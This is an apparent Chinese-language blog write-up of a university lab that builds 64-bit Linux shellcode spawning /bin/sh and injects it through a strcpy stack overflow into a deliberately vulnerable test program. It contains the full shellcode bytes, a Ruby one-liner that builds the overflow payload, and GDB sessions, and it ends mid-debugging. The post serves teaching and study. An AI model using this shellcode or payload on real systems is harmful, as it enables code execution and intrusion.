---
title: Buffer Overflow实践
date: 2016-05-11 10:19:27
tags: [Security, Assembly, Buffer Overflow]
---

　　上个世纪末，`Buffer Overflow`是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫`Return-Oriented Programming`，简称`ROP`。常见的实现手段有两种，其一是黑客向栈中注入自己设计的代码，然后将函数返回地址改成注入代码的起始位置，因此当函数返回时，程序就开始执行这段注入代码了，所以黑客想干嘛就能让程序干嘛。这种攻击方式非常强大，但有一个致命缺陷，它要求栈是可执行的(`executable`)，一旦栈是不可执行的，那么函数返回后，程序就因为错误而被终止(我们可以通过在gcc编译时加选项设定栈是否可执行)。另一种方法就是专门针对不可执行栈的，黑客不再向栈中注入自己的执行代码，而是通过各种黑科技来找到程序中的`gadget`(具体方法参照`MIT 6-858`第三节课，也有现成工具可以实现)，`gadget`是一些指令片段，常见的就是`ret`和`pop`的组合，黑客的目的在于，找到很多个这样的`gadget`后，将它们链接在一起，形成`gadget chain`，也就是一段执行代码。。。总的来说，黑客在无法自己注入代码时，他可以东拼西凑找现有的代码，把它们当成零件组装成自己想要的程序代码。这种实现方式难度极大，就跟拼图一样，真的要耐住性子才能成功。
　　`MIT 6-858`这门课的第一个实验就是分析一个web服务器的存在的漏洞，并利用这些漏洞实现`Buffer Overflow`攻击，分别涉及到可执行栈与不可执行栈，最后再修复这些漏洞。不得不说，MIT的实验难度和本校的实验难度完全不是一个level的，我们的实验是一种`跟着做`的形式，最后也只是跑了一个`shell`出来，而MIT的实验几乎就是真实的hack。我至今还没有完成这次实验，主要是自己对汇编不是很熟悉，然后也耐不住性子连续花上几天时间来调试，有兴趣的同学可以去看一下，这是[链接](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/labs/)。实验要求使用虚拟机跑MIT提供的系统镜像，保证运行环境一致，这里建议大家使用`Linux`+`kvm`来做实验，非常方便。
　　下面介绍我对`Buffer Overflow`的实践，内容是本校「信息安全综合实验」课程第二、三次实验——通过注入代码，使一个正常的程序能够运行shell。

> Start from here

　　总的来说，实验思路还是挺明了的，我们需要自己设计一段能运行shell的汇编代码，然后汇编成机器码，并注入到某个程序的堆栈中，最后修改`ip`寄存器，使程序执行我们注入的这段代码，从而跑出一个shell来。实验难度也不大，主要是要有耐心，毕竟本次实验涉及到大量的GDB调试操作，对GDB命令不熟悉的同学可能会吃些亏，因为调试过程会使用到一些较为复杂的命令参数。当然，只使用光秃秃的原始命令也是能够完成实验的，但会浪费一些时间。另外，实验环境为64位Linux系统，所以难度可能会稍微大一些，因为网上关于`Buffer Overflow`的实践教程全部都是基于32位系统的，我们只能靠自己来慢慢摸索。


## Design Shell Code

　　我们第一个任务是设计一串能够执行shell的机器指令，但我们知道，不同机器有不同的指令集，不同系统对系统调用的处理也不一样，那该怎么保证我们最终注入的代码能够正常工作呢？
　　答案很简单，我们直接找一个能在目的主机上运行的程序，仿照设计。如下所示即为我们的样例程序：
``` c
// sample.c
#include <stdio.h>
int main() {
   char *array[2];
   array[0] = "/bin/sh";
   array[1] = NULL;
   execve(array[0], array, NULL);
   return 0;
}
```
　　这个程序通过`execve`函数产生系统调用，使进程执行shell。我们可以观察该程序编译得到的汇编代码，找到执行shell需要哪些关键步骤，然后自己重新组织，即可设计出一串能执行shell的机器指令。
　　这里使用gcc进行编译，注意添加两种重要选项，分别是`-g`与`-static`，分别代表`生成调试信息`、`采用静态链接`，这样可以方便我们进行调试。编译完成后，使用GDB查看二进制文件的机器指令，如下所示：
``` bash
# main function
   │0x401164 <main>                 push   %rbp # 保存旧的rbp，即caller的frame pointer
   │0x401165 <main+1>               mov    %rsp,%rbp # 获取新的rbp，即callee的frame pointer
   │0x401168 <main+4>               sub    $0x10,%rsp # 分配栈空间，两个指针需要占用16字节
B+>│0x40116c <main+8>               movq   $0x495d64,-0x10(%rbp) # array[0]赋值
   │0x401174 <main+16>              movq   $0x0,-0x8(%rbp) # array[1]赋值
   │0x40117c <main+24>              mov    -0x10(%rbp),%rax # 将array[0]赋给rax
   │0x401180 <main+28>              lea    -0x10(%rbp),%rcx # 将array，即array[0]的地址赋给rcx
   │0x401184 <main+32>              mov    $0x0,%edx # 将NULL赋给edx
   │0x401189 <main+37>              mov    %rcx,%rsi
   │0x40118c <main+40>              mov    %rax,%rdi
   │0x40118f <main+43>              callq  0x40ef30 <execve> # 调用execve
   │0x401194 <main+48>              mov    $0x0,%eax # “return 0”中的0
   │0x401199 <main+53>              leaveq # 这里会将0x8(%rbp)赋给%rip，即恢复返回地址
   │0x40119a <main+54>              retq

# execve function
   │0x40ef30 <execve>               mov    $0x3b,%eax # 将0x3b赋给%eax
   │0x40ef35 <execve+5>             syscall # 系统调用，到此为止，之后的指令我们不用care
   │0x40ef37 <execve+7>             cmp    $0xfffffffffffff000,%rax
   │0x40ef3d <execve+13>            ja     0x40ef41 <execve+17>
   │0x40ef3f <execve+15>            repz retq
   │0x40ef41 <execve+17>            mov    $0xffffffffffffffc0,%rdx
   │0x40ef48 <execve+24>            neg    %eax
   │0x40ef4a <execve+26>            mov    %eax,%fs:(%rdx)
   │0x40ef4d <execve+29>            or     $0xffffffffffffffff,%rax
   │0x40ef51 <execve+33>            retq
```
　　以上即为整个程序的汇编代码，大家按照注释对整个流程分析一遍以后，基本上就能总结出执行shell的几个必要条件了：

　　1. 内存中存在字符串`/bin/sh`，以`\x00`结束
　　2. 内存中存在一个8字节的区域存放`字符串的地址`，后面跟着一个8字节的`0`
　　3. 将以上16字节区域的起始地址存入%rsi中
　　4. 将字符串地址存入%rdi中
　　5. 将`NULL`存入`%rdx`中
　　6. 将`0x3b`存入%rax中(不用纠结%eax或者%rax)
　　7. 系统调用，syscall指令

　　此时，我们只需要针对以上需求，自己设计汇编代码即可。然而，现实总是很残酷，第1点需求估计就能难倒不少人，把字符串加载到内存不难，直接用`.string`即可，但是我们怎么获取该字符串的地址呢？莫非只能通过手工计算？那样该多麻烦呀！在这里我想了很久，最终想出的办法是直接往栈里写入`/bin/sh`，地址可以通过对`%rsp`加加减减获得，但这样的方法非常不优雅，一旦我们不再执行`/bin/sh`，想换为`/usr/local/bin/zsh`，那么我们的代码需要进行大幅度的修改。后来在[Phrack](http://phrack.org/issues/49/14.html)上看到一个很tricky的办法，它很好的利用了`call`指令的特性，实现字符串地址的自动获取：

``` bash
# 非常妙的一种思路
    jmp bbb
aaa:
    do sth # 执行到这里时，%rsp所指向的8字节堆栈空间存放的就是"/bin/sh"的起始地址
    ...
bbb:
    call aaa # 执行这条指令时，会自动将下一条指令的地址压入堆栈
    .string "/bin/sh"
```
　　这样一来，我们就解决了获取字符串地址的问题，接下来的几个需求都很容易实现，这里就不做具体介绍，直接贴出我设计的一段代码：

``` bash
# shell_1.s
main:
    jmp bbb
aaa:
    movq $0x0, %rax
    movq %rax, 0x8(%rsp) # array[1]赋值为NULL，对应第2点需求
    movq 0x0(%rsp), %rdi # array[0]，即字符串地址，对应第4点需求
    lea 0x0(%rsp), %rsi # array，对应第3点需求
    movq $0x0, %rdx # NULL，对应第5点需求
    movl $0x3b, %eax # 对应第6点需求
    syscall # 对应第7点需求
bbb:
    callq aaa
    .string "/bin/sh" # 对应第1点需求

    .global main
    .type main, @function
```
　　使用gcc编译这段汇编代码，获得可执行文件，并运行：
![Selection_093.png-128.1kB][1]

　　It works!!! 可以看到，程序执行之前我们使用的shell是`bash`，而在程序执行以后，我们使用的shell是`/bin/sh`，这说明我们的代码能够正常产生`execve`系统调用。
　　好，这样是不是就已经完成我们的第一部分工作——**Design Shell Code**了呢？当然并没有这么简单！我们来分析一下这个程序可能存在的问题。首先，如果`execve`系统调用失败了会如何？很简单，在执行完`syscall`指令以后，由于系统调用失败，程序并不会发生跳转，而是继续执行下一条指令，也就是`callq aaa`指令，显然这将导致死循环，最终导致程序崩溃。有兴趣的同学可以自己做一个小实验，把系统调用的三个参数修改一下，然后重新编译运行，我们会发现程序卡住一段时间，然后自动崩溃，并报错`Segmentation fault (core dumped)`。为了解决这一隐患，我们可以在原有的`syscall`指令后面再添加几条指令，调用`exit`，强行终止程序。这几条指令的设计和之前执行shell指令的设计原理类似，我们编写一个简单的C程序，其中调用`exit(0)`，然后将其编译得到可执行文件，观察`exit`这个系统调用需要哪些条件，我们再有针对性的为其设计指令即可：

``` c
// sample2.c
#include <stdlib.h>
int main() {
    exit(0);
}
```
程序汇编指令如下所示：
``` bash
# main function
   │0x401164 <main>                 push   %rbp
   │0x401165 <main+1>               mov    %rsp,%rbp
B+>│0x401168 <main+4>               mov    $0x0,%edi
   │0x40116d <main+9>               callq  0x401c00 <exit>

# exit function
   │0x401c00 <exit>                 sub    $0x8,%rsp
   │0x401c04 <exit+4>               mov    $0x1,%edx
   │0x401c09 <exit+9>               mov    $0x6c1080,%esi
   │0x401c0e <exit+14>              callq  0x401b00 <__run_exit_handlers>

# __run_exit_handlers function
   # ... 省略
   │0x401bdd <__run_exit_handlers+221>      add    $0x8,%rbp
   │0x401be1 <__run_exit_handlers+225>      cmp    $0x4b3050,%rbp
   │0x401be8 <__run_exit_handlers+232>      jb     0x401bda <__run_exit_handlers+218>
   │0x401bea <__run_exit_handlers+234>      mov    %ebx,%edi
  >│0x401bec <__run_exit_handlers+236>      callq  0x40eec0 <_exit>
   # ... 省略

# _exit function
   │0x40eec0 <_exit>                movslq %edi,%rdx
   │0x40eec3 <_exit+3>              mov    $0xffffffffffffffc0,%r9
   │0x40eeca <_exit+10>             mov    $0xe7,%r8d
   │0x40eed0 <_exit+16>             mov    $0x3c,%esi
   │0x40eed5 <_exit+21>             jmp    0x40eef0 <_exit+48>
   │0x40eed7 <_exit+23>             nopw   0x0(%rax,%rax,1)
   │0x40eee0 <_exit+32>             mov    %rdx,%rdi
   │0x40eee3 <_exit+35>             mov    %esi,%eax
   │0x40eee5 <_exit+37>             syscall
   │0x40eee7 <_exit+39>             cmp    $0xfffffffffffff000,%rax
   │0x40eeed <_exit+45>             ja     0x40ef08 <_exit+72>
   │0x40eeef <_exit+47>             hlt
   │0x40eef0 <_exit+48>             mov    %rdx,%rdi
   │0x40eef3 <_exit+51>             mov    %r8d,%eax
  >│0x40eef6 <_exit+54>             syscall
   │0x40eef8 <_exit+56>             cmp    $0xfffffffffffff000,%rax
   │0x40eefe <_exit+62>             jbe    0x40eee0 <_exit+32>
   │0x40ef00 <_exit+64>             neg    %eax
   │0x40ef02 <_exit+66>             mov    %eax,%fs:(%r9)
   │0x40ef06 <_exit+70>             jmp    0x40eee0 <_exit+32>
   │0x40ef08 <_exit+72>             neg    %eax
   │0x40ef0a <_exit+74>             mov    %eax,%fs:(%r9)
   │0x40ef0e <_exit+78>             jmp    0x40eeef <_exit+47>
```

　　不得不说，分析`exit`的汇编指令比分析`execve`要难得多，因为这里面涉及到了3层调用，尤其是`__run_exit_handlers`，看着就头痛。更悲剧的是，由于`syscall`前面有近百条汇编指令，系统调用的参数可能在之前某一条指令中就已经存入寄存器了，如果要分析出该系统调用具体有哪些必需参数，貌似我们只能把每一条指令都弄明白。不过程序员可不是苦力，怎么能干这种吃力不讨好的事呢？肯定有投机取巧的方法！
　　不同于32位机的堆栈传递参数，对于64位机，我们知道，函数调用的参数是通过寄存器传递的，而常用的寄存器就那么几个，分别是`%rdi`、`%rsi`、`%rdx`、`%rax`，因此，我们完全可以在执行`syscall`指令前把这几个寄存器的值全部抓下来，不管是不是真正的参数，总之我在使用的时候就按这个进行赋值，这样总能执行成功吧！话不多说，立马实践，使用GDB跟踪程序到`syscall`指令，然后查看四个参数寄存器的值：
　　![Selection_094.png-128.3kB][2]
　　这样，我们也就获得了调用`exit`的几个必要条件：

　　1. 将`0xe7`存入`%rax`(实际上是`%eax`)中
　　2. 将`0x0`存入`%rdx`中
　　3. 将`0x0`存入`%rdi`中
　　4. 将`0x3c`分别存入`%rsi`中
　　5. 系统调用，syscall指令

　　根据以上需求，我们可以设计出能够产生`exit`系统调用的代码段：

``` bash
# exit.s
main:
    movl $0xe7, %eax # 对应第1点需求
    movq $0x0, %rdx # 对应第2点需求
    movq $0x0, %rdi # 对应第3点需求
    movq $0x3c, %rsi # 对应第4点需求
    syscall # 对应第5点需求

    .global main
    .type main, @function
```
　　使用gcc将这段代码汇编成可执行文件，然后使用GDB跟踪调试，发现执行完`syscall`指令后，该进程正常退出，这表明我们设计的代码能够正常产生`exit`系统调用。
``` bash
(gdb) ni
[Inferior 1 (process 764) exited normally]
warning: Error removing breakpoint -9
(gdb)
```

　　不过，经过测试(其实就是依次修改各个参数寄存器的值，查看程序能否正常退出)，我们会发现，列出的5点需求中，只有第1、3、5点需求是必要的，其余两点需求可以忽略，因此，我们的代码可以继续精简两行，直接把`movq $0x0, %rdx`和`movq $0x3c, %rsi`删掉即可。
　　至此，我们可以将两串代码拼接在一起：
``` bash
# shell_2.s
main:
    jmp bbb
aaa:
    movq $0x0, %rax
    movq %rax, 0x8(%rsp)
    movq 0x0(%rsp), %rdi
    lea 0x0(%rsp), %rsi
    movq $0x0, %rdx
    movl $0x3b, %eax
    syscall
    movl $0xe7, %eax
    movq $0x0, %rdi
    syscall
bbb:
    callq aaa
    .string "/bin/sh"

    .global main
    .type main, @function
```
　　这个程序不仅能够产生`execve`系统调用，执行shell，还能在`execve`系统调用失败时正常退出，以免发生错误。理论上来说，这段代码已经基本满足我们对**shell code**的功能需求，然而，它却无法使用。为了说明这一点，我们可以查看一下这些指令对应的机器码：

``` bash
3130104006@hamsa:~/project2$ objdump -d shell_2 | grep -A20 '<main>'
0000000000401164 <main>:
  401164:	eb 30                	jmp    401196 <bbb>

0000000000401166 <aaa>:
  401166:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
  40116d:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  401172:	48 8b 3c 24          	mov    (%rsp),%rdi
  401176:	48 8d 34 24          	lea    (%rsp),%rsi
  40117a:	48 c7 c2 00 00 00 00 	mov    $0x0,%rdx
  401181:	b8 3b 00 00 00       	mov    $0x3b,%eax
  401186:	0f 05                	syscall
  401188:	b8 e7 00 00 00       	mov    $0xe7,%eax
  40118d:	48 c7 c7 00 00 00 00 	mov    $0x0,%rdi
  401194:	0f 05                	syscall

0000000000401196 <bbb>:
  401196:	e8 cb ff ff ff       	callq  401166 <aaa>
  40119b:	2f                   	(bad)
  40119c:	62                   	(bad)
  40119d:	69 6e 2f 73 68 00 90 	imul   $0x90006873,0x2f(%rsi),%ebp
  4011a4:	90                   	nop
```
　　注意到，我们设计的汇编代码在翻译成机器指令后，出现了大量的`\x00`字段，这在代码注入环节是不可接受的！因为`buffer overflow`的攻击目标是那些使用了**批量写内存**操作的程序，比如常见的`gets()`、`strcpy`函数，这些函数一般具有同一个特征——**没有指定向内存中写多少字节**。举个例子，对于字符串拷贝函数`strcpy`，它以字节为单位，从源地址读取数据，向目的地址写入数据，然后源地址和目的地址同时递增，继续下一次拷贝，直至遇到`\x00`时终止操作，因为这是字符串的结束标记。由此可见，假设我们利用`strcpy`函数将之前设计的机器码注入到内存，那么仅有第一个`\x00`前面的内容(这里即`\xeb\x29\x48\xc7\c0`)能够注入，后面的内容都将被忽略，这显然是一次失败的攻击。
　　为了解决这一缺陷，我们需要人为地消除`\x00`。幸运的是，我们的攻击目标是一台`x86`的机器，`CISC`架构使得它的指令长度是不固定的，从而能够获得非常高的指令密度，我们利用这一特性，可以对设计的指令做一些小的修改，消除`\x00`的存在。具体如下所示：
``` bash
    movq    $0x0,%rax       ---->      xor    %rax,%rax
    movq    $0x0,%rdx       ---->      xor    %rdx,%rdx
    movl    $0x3b,%eax      ---->      movb    $0x3b,%al
```
　　其实原理很简单，无非就是消除立即数中的`\x00`字段，这可以通过使用其他指令或者分割立即数来实现。
　　最终我们得到的无`\x00`版汇编代码如下所示：
``` bash
# shell_3.s
main:
    jmp bbb
aaa:
    xor %rax, %rax
    movq %rax, 0x8(%rsp)
    movq 0x0(%rsp), %rdi
    lea 0x0(%rsp), %rsi
    xor %rdx, %rdx
    movb $0x3b, %al
    syscall
    xor %rax, %rax
    movb $0xe7, %al
    xor %rdi, %rdi
    syscall
bbb:
    callq aaa
    .string "/bin/sh"

    .global main
    .type main, @function
```
　　对应机器码如下所示，可以看到代码部分已经不存在`\x00`字段了：
``` bash
3130104006@hamsa:~/project2$ objdump -d shell_3 | grep -A20 '<main>'
0000000000401164 <main>:
  401164:	eb 21                	jmp    401187 <bbb>

0000000000401166 <aaa>:
  401166:	48 31 c0             	xor    %rax,%rax
  401169:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  40116e:	48 8b 3c 24          	mov    (%rsp),%rdi
  401172:	48 8d 34 24          	lea    (%rsp),%rsi
  401176:	48 31 d2             	xor    %rdx,%rdx
  401179:	b0 3b                	mov    $0x3b,%al
  40117b:	0f 05                	syscall
  40117d:	48 31 c0             	xor    %rax,%rax
  401180:	b0 e7                	mov    $0xe7,%al
  401182:	48 31 ff             	xor    %rdi,%rdi
  401185:	0f 05                	syscall

0000000000401187 <bbb>:
  401187:	e8 da ff ff ff       	callq  401166 <aaa>
  40118c:	2f                   	(bad)
  40118d:	62                   	(bad)
  40118e:	69 6e 2f 73 68 00 90 	imul   $0x90006873,0x2f(%rsi),%ebp
```

　　需要注意的是，不只是`\x00`，在某些场景下，`\x0A`、`\x0D`、`\x20`以及`\x08`这些特殊字符也会影响到代码的注入，这个就要具体问题具体分析了，不能一概而论，总之，大家可以暂时忽略这些隐患，而在真正注入代码时，观察能否注入成功，如果不能，再根据具体原因来修改代码，千万不要空想代码可能存在哪些bug。
　　我最初做到这里的时候，就直接开始做下一步工作了，但事实上这段代码还存在一个问题，虽然现在单独使用并没有任何影响，但在真正注入时会使得攻击失效。为了方便，我直接在这里提出来，其实就是字符串末尾必须填入一个`\x00`，否则传入`execve`的参数不再是`/bin/sh`字符串，而是`/bin/sh***`，这样会导致系统调用失败；同时，又考虑到`\x00`会终止整个的代码的注入，所以我们不能简单地补上一个`\x00`。这时我们该怎么做呢？答案其实也不难，直接在代码里对字符串末尾的字节进行修改，赋值为0就好了嘛！所以，**最终**我们将使用的shell code是这样的：

``` bash
main:
    jmp bbb
aaa:
    xor %rax, %rax
    movq %rax, 0x8(%rsp)
    movq 0x0(%rsp), %rdi
    movb %al, 0x7(%rdi) # %rdi为字符串起始地址，这里就是将第8个字符赋值为0
    lea 0x0(%rsp), %rsi
    movb $0x3b, %al
    syscall
    xor %rax, %rax
    movb $0xe7, %al
    xor %rdi, %rdi
    syscall
bbb:
    callq aaa
    .string "/bin/sh"

    .global main
    .type main, @function
```

　　需要注意的是，不同于前面几版的shell code，最终版的程序是无法单独运行的，因为指令`movb %al, 0x7(%rdi)`有对代码段(code section，只读区域)进行修改，这是不被允许的，所以程序在执行到这条指令时，会产生错误`Segmentation fault (core dumped)`。但不用担心，当我们将这段代码注入到目标程序以后，它又是可以运行的了！因为我们是将代码注入到目标程序的栈中，我们知道栈空间的数据是可以修改的，不像代码段那样只可读不可写。
　  不过为了证明最终的代码可以工作，我们还是能设计一个简单的测试程序来验证的：
``` c
// test_final.c
char shellcode[] = "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh";
// 汇编代码翻译后得到的机器码
void shell() {
        long long *ret;
        ret = (long long *)&ret + 0x2; // 这一步有些tricky，其实作用就是使ret指向函数返回地址
        *ret = (long long)shellcode; // 有了上一步，这里我们就可以修改返回地址，使程序跳转到shellcode
}
int main() {
        shell();
        return 0;
}
```
　　这里稍微解释一下程序中最为关键的一步：`ret = (long long *)&ret + 0x2;`。参照我的另一篇博文[Buffer Overflow(理论篇)](http://121.42.178.158/buffer-overflow-theory)，在程序执行过程中，栈的结构是这样的：
```  bash
# stack
                 +----------------+
entry %rbp ----> |.. prev frame ..|
                 |                |
                 |                |
                 +----------------+
entry %rsp ----> | return address | # 我们要修改的是这个位置
                 +----------------+
new %rbp   ----> |   saved %rbp   |
                 +----------------+
                 |     Local      | # <------ ret指针就在这里
new %rsp   ----> |   Variables    |
                 +----------------+
```
　　对于64位系统，<code>return address</code>、`saved %rbp`以及`long long *`所占用的空间都是8字节，因此，`return address`的地址要比`ret`的地址大16个字节，也就是**2**个`long long *`的长度！这么一说，想必大家都已经明白`ret = (long long *)&ret + 0x2`的原理了，它最终会使得`ret`指向函数返回地址，从而我们能够通过修改`*ret`来实现对返回地址的修改。   　　
　　最终测试程序运行如下所示：
　![Selection_095.png-103kB][3]
　　至此，第一部分工作正式完成，我们已经为`buffer overflow`攻击打下了很好的基础，下面就是真正的实践了。

## Exploit Buffer Overflow with GDB

　　我们已经完成`恶意代码`的设计，下面我们开始尝试将代码注入到一个很`weak`的程序中，使它能够按照我们的意愿来工作(其实就是执行shell啦)。目标程序代码如下所示：

``` c
// victim.c
#include <stdio.h>
#include <string.h>

void foo(char *arg) {
	char buffer[64];
	strcpy(buffer, arg);
}
int main(int argc, char *argv[]) {
	foo(argv[1]);
	return(0);
}
```
``` bash
# 编译目标代码
3130104006@hamsa:~/project3$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim
# -g 表示生成调试信息，方便使用GDB调试
# -Wall 表示打开警告开关，提示所有warning信息
# -fno-stack-protector 表示禁用栈保护机制，如果没有这个选项，本次实验无法完成。这里的栈保护机制其实就是canary
# -z execstack 表示允许栈可执行，没有这个选项，本次实验也无法完成
# -static 表示静态链接
```
　　为什么说这个程序很`weak`呢？这里用过`Visual Studio`的同学一定很有感受，如果我们的工程里有使用`gets`、`strcpy`这样的函数，那么编译时IDE一定会抱怨这些函数是`dangerous`的，蛋疼的是，它报的不是warning，而是error，这样也就导致工程无法编译。我们的目标程序刚好使用到了`strcpy`函数，这让我们有可趁之机，因为该函数并没有做边界限制，理论上来说，只要不遇到终止符`\x00`，它就会一直进行内存拷贝，我们利用这一特性，可以输入一串很长的数据，然后通过`strcpy`拷贝到本地变量`buffer`中，但由于我们输入的数据长度要超过buffer的长度，甚至还会覆盖到`foo`函数的返回地址字段，所以我们还能利用输入的数据将函数返回地址修改掉，使程序返回时跳到我们规定的位置(一般是注入代码的起始地址，也就是buffer的地址)，执行我们注入的代码，这就是`buffer overflow`攻击的一种实现原理。
　　根据实验原理，为了实现攻击，除了需要一段恶意代码之外，我们还需要知道这段恶意代码注入到内存中后的起始地址，如此才能正确覆写程序返回地址。这里，我们可以使用GDB来跟踪程序的运行，查看程序进入`foo`函数后，buffer的起始地址是多少。
``` bash
# Debug victim program with GDB
   ┌─────────────────────────────────────────────────────────────────────────┐
   │0x401164 <foo>          push   %rbp                                      │
   │0x401165 <foo+1>        mov    %rsp,%rbp                                 │
   │0x401168 <foo+4>        sub    $0x50,%rsp                                │
   │0x40116c <foo+8>        mov    %rdi,-0x48(%rbp)                          │
   │0x401170 <foo+12>       mov    -0x48(%rbp),%rdx # 将argv[1]的地址赋给%rdx│
   │0x401174 <foo+16>       lea    -0x40(%rbp),%rax # 将buffer的地址赋给%rax │
  >│0x401178 <foo+20>       mov    %rdx,%rsi # 程序暂时停在这个位置          │
   │0x40117b <foo+23>       mov    %rax,%rdi                                 │
   │0x40117e <foo+26>       callq  0x400320 # strcpy函数调用                 │
   │0x401183 <foo+31>       leaveq                                           │
   │0x401184 <foo+32>       retq                                             │
   └─────────────────────────────────────────────────────────────────────────┘
child process 17315 In: foo                           Line: 6    PC: 0x401178
(gdb) p/x $rax
$1 = 0x7fffffffe3d0 # 根据0x401174这条指令，我们知道buffer地址存放在%rax寄存器中
(gdb)
```
　　由上，我们知道buffer的起始地址是`0x7fffffffe3d0`，理论上来说，这个应该就是注入代码的起始地址了。有的同学可能会怀疑这个地址只是一个随机数，下次执行时就不一样了。这样的想法非常合理，然而，如果再多测试几次，我们会惊讶地发现，这个值还真是固定的，并不是随机分配的。这是因为，GDB默认会关闭`stack randomization`，也就是说，在不受其他外界因素影响的前提下，调试程序每次开始执行时的栈顶地址都是固定的，从而buffer的地址也不会变。我们可以通过`show disable-randomization`来查看GDB是否已关闭`stack-randomization`，也可以通过`set disable-randomization on/off`修改这一选项：
``` bash
(gdb) show disable-randomization
Disabling randomization of debuggee's virtual address space is on.
(gdb) set disable-randomization off
(gdb) set disable-randomization on
(gdb)
```
　　好，现在我们有了恶意代码，也有了代码注入后的起始地址，接下来就是研究栈的结构，方便我们准确地修改到函数返回地址：
``` bash
# stack for foo function
                 +----------------+
                 |      ...       | # main function's frame
                 +----------------+
                 | return address | # 我们要修改的是这个位置
                 +----------------+
    %rbp   ----> |   saved %rbp   |
                 +----------------+
                 |  buffer[63:56] |
                 |  buffer[55:48] |
                 |  buffer[47:40] |
                 |  buffer[39:32] |
                 |  buffer[31:24] |
                 |  buffer[23:16] |
                 |  buffer[15:8]  |
                 |  buffer[7:0]   | # 地址为0x7fffffffe3d0
                 |      ...       |
    %rsp   ----> |      ...       |
                 +----------------+
```
　　我们输入的数据将会从`buffer[0]`开始，一直往上填充，直至将`return address`字段修改。我们的实验主机为64位系统，可以计算出，我们需要至少先输入`72`字节的数据，才能开始修改`return address`字段，而我们希望将返回地址修改为`0x7fffffffe3d0`，所以，我们总共需要输入`78`字节的数据。下面，我们来构造输入数据。
　　首先，毋庸置疑，我们需要将恶意代码作为输入数据的一部分，这里我把它放在输入数据的最前方：
``` bash
# 恶意代码总共50字节
\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh
```
　　现在我们还22个字节才能达到`72`字节，而事实上，这22个字节的数据是不起作用的，因为程序执行完恶意代码后就会自动退出，所以这22个字节我们可以自己随便凑，但是注意别作死地选`\x00`、`\x20`这样的数，它们会终止代码的注入，这里我建议大家使用`\x90`，因为这在`x86`机器上是`NOP`指令的机器码，所以不管我们把`\x90`添加在什么位置(可以在恶意代码前，也可以在恶意代码中，只要不是一条指令中间--!)，都不会影响程序的正常执行。
　　通过添加`\x90`将数据填充到72字节后，我们就可以将地址`0x7fffffffe3d0`添加到输入数据的末尾：
``` bash
\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh\x90...\x90\xd0\xe3\xff\xff\xff\x7f
```
　　这里千万要注意小端机与大端机的区别，这会影响到地址`0x7fffffffe3d0`的表示，在小端机里，它要通过`\xd0\xe3\xff\xff\xff\x7f`来表示。
　　我们将构造的输入数据保存到文件`evil.bin`中，方便以后使用。继续使用GDB调试，以`evil.bin`文件内容作为输入，运行目标程序，观察攻击是否生效：
``` bash
3130104006@hamsa:~/project3$ ruby -e 'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\xd0\xe3\xff\xff\xff\x7f"' > evil.bin
3130104006@hamsa:~/project3$ gdb -q victim
Reading symbols from /home/3130104006/project3/victim...done.
(gdb) b foo
Breakpoint 1 at 0x401170: file victim.c, line 6.
(gdb) r `cat evil.bin`
Starting program: /home/3130104006/project3/victim `cat evil.bin`
#
# ...
#
B+ │0x401170 <foo+12>       mov    -0x48(%rbp),%rdx                          │
   │0x401174 <foo+16>       lea    -0x40(%rbp),%rax                          │
   │0x401178 <foo+20>       mov    %rdx,%rsi                                 │
   │0x40117b <foo+23>       mov    %rax,%rdi                                 │
>  │0x40117e <foo+26>       callq  0x400320                                  │
  >│0x401183 <foo+31>       leaveq # 程序暂时停在这里                        │
   │0x401184 <foo+32>       retq                                             │
   │0x401185 <main>         push   %rbp                                      │
   │0x401186 <main+1>       mov    %rsp,%rbp                                 │
   │0x401189 <main+4>       sub    $0x10,%rsp                                │
   │0x40118d <main+8>       mov    %edi,-0x4(%rbp)                           │
   │0x401190 <main+11>      mov    %rsi,-0x10(%rbp)                          │
   │0x401194 <main+15>      mov    -0x10(%rbp),%rax                          │
   │0x401198 <main+19>      add    $0x8,%rax                                 │
   └─────────────────────────────────────────────────────────────────────────┘
child process 20231 In: foo                           Line: 7    PC: 0x401183
(gdb) x/2gx $rbp
0x7fffffffe3c0: 0x9090909090909090      0x00007fffffffe3d0
(gdb)
```
　　当程序执行完对`strcpy`的调用，停在`0x401183`处时，我们利用`x`命令查看栈数据，发现`%rbp + 8`存放的就是我们之前注入的返回地址`0x7fffffffe3d0`，这说明我们的注入步骤成功啦！于是，小明自信地敲下`c`键，满怀信心地期待着攻击的生效，结果让他一脸懵逼的一幕出现了：
``` bash
# 程序跑飞了～～
   ┌─────────────────────────────────────────────────────────────────────────┐
  >│0x7fffffffe3d2  (bad)                                                    │
   │0x7fffffffe3d3  (bad)                                                    │
   │0x7fffffffe3d4  (bad)                                                    │
   │0x7fffffffe3d5  jg     0x7fffffffe3d7                                    │
>  │0x7fffffffe3d7  add    %al,(%rax)                                        │
   │0x7fffffffe3d9  add    %al,(%rax)                                        │
